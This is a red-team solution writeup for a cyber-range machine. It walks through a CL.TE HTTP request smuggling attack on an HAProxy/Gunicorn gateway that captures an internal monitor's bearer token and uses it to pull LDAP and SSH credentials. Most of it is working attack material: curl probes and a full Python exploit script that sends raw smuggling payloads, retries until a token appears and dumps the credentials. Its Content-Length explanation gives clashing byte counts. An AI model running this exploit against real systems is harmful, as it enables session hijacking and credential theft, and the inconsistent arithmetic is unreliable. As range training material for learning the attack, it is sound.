# solve_red.md — M4 · ext-haproxy
## Red Team Solution Writeup
**Range:** RNG-EXT-01 · SETU DVAAR · OPERATION DEEPSTRIKE
**Machine:** M4 — RPAL API Gateway (HAProxy + Flask backend)
**Vulnerability:** HTTP Request Smuggling (CL.TE) — Session Token Capture via Victim Request Interception
**CWE:** CWE-444 (Inconsistent Interpretation of HTTP Requests)
**MITRE ATT&CK:** T1557 (Adversary-in-the-Middle) · T1550 (Use Alternate Authentication Material)
**Severity:** Critical — captures live privileged session token → admin API → LDAP credentials

---

## Overview — What, Why, and How

### What is HTTP Request Smuggling (CL.TE)?

HTTP/1.1 allows two ways to specify request body length:
- **Content-Length (CL):** Body is exactly N bytes
- **Transfer-Encoding: chunked (TE):** Body is divided into chunks, terminated by a zero-length chunk

When a reverse proxy and backend server disagree on which header takes precedence, a single HTTP request can be interpreted as **two different requests** — one by the proxy, one by the backend.

**CL.TE variant (this challenge):**
- **HAProxy (frontend):** Honours `Content-Length`, ignores `Transfer-Encoding`
- **Gunicorn backend:** Honours `Transfer-Encoding: chunked` when present

```
Attacker sends to HAProxy:
  POST /api/v2/permits/submit HTTP/1.1
  Content-Length: 45        ← HAProxy uses this: reads 45 bytes (the full body)
  Transfer-Encoding: chunked ← HAProxy forwards this header but ignores for routing

  0\r\n                      ← Chunk: 0 bytes (zero-length = end of chunked body)
  \r\n
  GET /api/v2/admin/export   ← This is AFTER the zero chunk (backend sees this as new request)

HAProxy interpretation: one request with 45-byte body → forwards to backend
Backend interpretation:
  - Request 1: chunked body, reads chunk "0" → 0 bytes → body ends
  - Request 2: starts reading: "GET /api/v2/admin/export..." → left in buffer
  - When the NEXT legitimate request arrives, it gets PREPENDED with our smuggled prefix
```

### Why does this exist?

The HAProxy configuration forwards the `Transfer-Encoding` header to the backend without normalisation. The Gunicorn backend (Python WSGI server) processes chunked encoding natively. HAProxy 2.x defaults changed in version 2.2 to prevent this — but the RPAL configuration was created against HAProxy 2.0 and the `option http-server-close` directive that would have prevented this was not in the template used by Rajan Iyer's team.

### What makes this extra interesting?

The internal `rpal-apigw-monitor` service makes authenticated requests every 10 seconds. When the smuggled prefix is in the backend's buffer, the monitor's next request gets appended to the prefix — exposing its `Authorization: Bearer` header in the backend's error response. This is a **live request capture**.

---

## Prerequisites

- Target: `http://203.x.x.x:80/` (HAProxy frontend)
- Tools: `curl`, Python3, timing patience
- No credentials needed for the initial smuggle — the captured token is the goal

---

## Phase 1 — Confirming the CL.TE Desync

### 1.1 — Verify HAProxy is in the Path

```bash
curl -si http://203.x.x.x:80/api/v1/status | grep -i "server\|via\|x-"
# Look for Server header — absence of backend framework header suggests proxy
curl -si http://203.x.x.x:80/api/v1/status | head -20
```

### 1.2 — Confirm CL.TE Differential

This test verifies that the backend processes Transfer-Encoding differently:

```bash
# Send a request with both headers where CL says body is larger than TE chunk
# If backend uses TE, it reads 0 bytes from chunk and "G" is left in buffer
# If backend uses CL, it reads all 4 bytes including "G"
curl -s http://203.x.x.x:80/api/v2/permits/submit \
  -X POST \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data $'0\r\n\r\nG'
```

If you get a **timeout or hang** on the second request: the backend consumed the chunk (TE processing) and left "G" in the buffer. CL.TE desync confirmed.

---

## Phase 2 — Crafting the Smuggling Payload

The goal is to smuggle a partial HTTP request prefix into the backend's connection buffer. When the internal monitor makes its next GET request to `/api/v2/permits/status`, the backend prepends your prefix to it — resulting in the monitor's `Authorization` header appearing in an error response body.

### 2.1 — Understanding the Timing

The internal monitor (rpal-apigw-monitor) sends a request every 10 seconds. Your smuggled payload must:
1. Arrive at the backend
2. Leave a partial request in the buffer
3. The monitor's next request arrives within ~10s and gets poisoned

### 2.2 — The Smuggle Payload

```
POST /api/v2/permits/submit HTTP/1.1\r\n
Host: api-gw.rpal.in\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 65\r\n                   ← HAProxy sees: body is 65 bytes total
Transfer-Encoding: chunked\r\n           ← Backend sees: chunked encoding
\r\n
0\r\n                                    ← Chunk size 0 = end of chunked body (backend stops here)
\r\n
GET /api/v2/admin/export HTTP/1.1\r\n    ← This stays in backend buffer (35 chars = 65-0chunk(5))
Host: api-gw.rpal.in\r\n                ← When monitor's request arrives, backend prepends this
```

**Content-Length calculation:**
The CL must equal: (length of chunk header "0\r\n\r\n" = 5 bytes) + (length of smuggled prefix)

Smuggled prefix: `GET /api/v2/admin/export HTTP/1.1\r\nHost: api-gw.rpal.in\r\nFoo: `
Count: 35 + 16 + 4 + 5 (chunk overhead) = 60 bytes total

### 2.3 — The Exploit Script

```python
#!/usr/bin/env python3
"""
HTTP Request Smuggling (CL.TE) — Session Token Capture
Target: HAProxy → Gunicorn (CL.TE desync)
Goal:   Capture Authorization header of internal monitor service
"""
import socket, time, re, sys

TARGET_HOST = "203.x.x.x"
TARGET_PORT = 80

def send_raw(host, port, data: bytes, recv_timeout=15) -> bytes:
    """Send raw HTTP data and return response."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    s.connect((host, port))
    s.sendall(data)
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

# ── The smuggling payload ──────────────────────────────────────────────────────
# The smuggled prefix we want in the backend's buffer:
# When the monitor's request arrives, backend prepends this prefix to it.
# The backend then processes: "POST /api/v2/permits/submit...Authorization: Bearer <monitor_token>"
# And returns an error with the Authorization header reflected.

smuggled_prefix = (
    "POST /api/v2/permits/submit HTTP/1.1\r\n"
    "Host: api-gw.rpal.in\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 200\r\n"    # Large CL to absorb monitor's headers
    "Foo: "                       # Open header — monitor's headers get appended here
)

# The zero-chunk terminates the backend's view of our request body
# Everything after is left in the buffer
chunk_zero = "0\r\n\r\n"

# Full body from backend's CL perspective:
# chunk_zero + smuggled_prefix = the "45-byte body" HAProxy sends
body = chunk_zero + smuggled_prefix
body_len = len(body)

attack_request = (
    f"POST /api/v2/permits/submit HTTP/1.1\r\n"
    f"Host: api-gw.rpal.in\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {body_len}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"{body}"
).encode()

print("[*] HTTP Request Smuggling — CL.TE Session Token Capture")
print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] Smuggled prefix length: {len(smuggled_prefix)} bytes")
print(f"[*] Attack request body length (CL): {body_len}")
print()

attempt = 0
while True:
    attempt += 1
    print(f"[*] Attempt {attempt} — sending smuggle payload...")

    # Send the CL.TE smuggling request
    resp = send_raw(TARGET_HOST, TARGET_PORT, attack_request, recv_timeout=5)
    print(f"    Attack response: {resp.split(b'\\r\\n')[0].decode(errors='replace')}")

    # Immediately send a normal request — or wait for the monitor's request
    # The monitor sends every 10s — wait and let it arrive naturally
    # The backend will return an error containing the monitor's Authorization header
    print(f"[*] Waiting {8}s for internal monitor request to trigger...")
    time.sleep(8)

    # Send a probe request to check if the buffer was poisoned
    # (The monitor should have triggered it — if not, try again)
    probe = (
        f"GET /api/v2/permits/status HTTP/1.1\r\n"
        f"Host: api-gw.rpal.in\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    probe_resp = send_raw(TARGET_HOST, TARGET_PORT, probe, recv_timeout=5)
    probe_str = probe_resp.decode(errors='replace')

    # Check if the response contains a captured Authorization header
    if "Authorization:" in probe_str or "Bearer rpal-sess-" in probe_str:
        print(f"\n[+] SUCCESS! Captured victim request content:")
        print(probe_str[:1000])

        # Extract the token
        m = re.search(r'Authorization: Bearer (rpal-sess-[^\s\\r\\n]+)', probe_str)
        if m:
            token = m.group(1)
            print(f"\n[+] Captured token: {token}")
            print(f"\n[*] Using token to access admin export endpoint...")
            break
    else:
        print(f"    No capture yet — backend response: {probe_str[:100]}")
        print(f"    Retrying in 5s...\n")
        time.sleep(5)

    if attempt > 20:
        print("[-] Max attempts reached. Verify timing and smuggle payload.")
        sys.exit(1)

# ── Use captured token to access admin export ──────────────────────────────────
import urllib.request, json

req = urllib.request.Request(
    f"http://{TARGET_HOST}:80/api/v2/admin/export",
    headers={"Authorization": f"Bearer {token}",
             "X-RPAL-Service": "apigw-permit-monitor",
             "Host": "api-gw.rpal.in"}
)
with urllib.request.urlopen(req, timeout=10) as r:
    data = json.loads(r.read())

print("\n[+] Admin export accessed with captured token!")
print("[+] LDAP credentials extracted:")
ldap = data.get('gateway_config', {}).get('ldap_integration', {})
for k, v in ldap.items():
    print(f"    {k}: {v}")

print("\n[+] SSH pivot credentials:")
ssh = data.get('gateway_config', {}).get('corporate_ssh', {})
for k, v in ssh.items():
    print(f"    {k}: {v}")
```

---

## Pitfalls and Common Mistakes

### Pitfall 1 — Timing
The monitor sends every 10 seconds. If your smuggled prefix expires from the backend's buffer before the monitor's request arrives (connection reuse timeout), the attack fails silently. Send the attack request and wait 5–12 seconds, then probe. Repeat up to 20 times.

### Pitfall 2 — Content-Length Calculation Off by One
If CL is off, the backend either reads too much (consuming your smuggled prefix as body) or too little (backend waits for more data). Calculate precisely: CL = length of zero-chunk string (`0\r\n\r\n` = 5) + length of smuggled prefix string.

### Pitfall 3 — HTTP/2 Not Vulnerable to CL.TE
This attack only works on HTTP/1.1. If HAProxy upgrades to HTTP/2 for the backend connection, CL.TE smuggling is not possible (HTTP/2 uses a different framing mechanism). Verify with: `curl --http1.1 ...`

### Pitfall 4 — Connection Reuse Required
The desync exploits a **persistent connection** where the backend keeps the buffer between requests. If HAProxy closes and reopens a connection for each request (which `option http-server-close` would cause on the backend side), the poisoned buffer is discarded. The configuration here keeps connections persistent.

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Adversary-in-the-Middle | T1557 |
| Lateral Movement | Use Alternate Authentication Material | T1550 |

---
*solve_red.md | M4 ext-haproxy | RNG-EXT-01 SETU DVAAR | OPERATION DEEPSTRIKE*
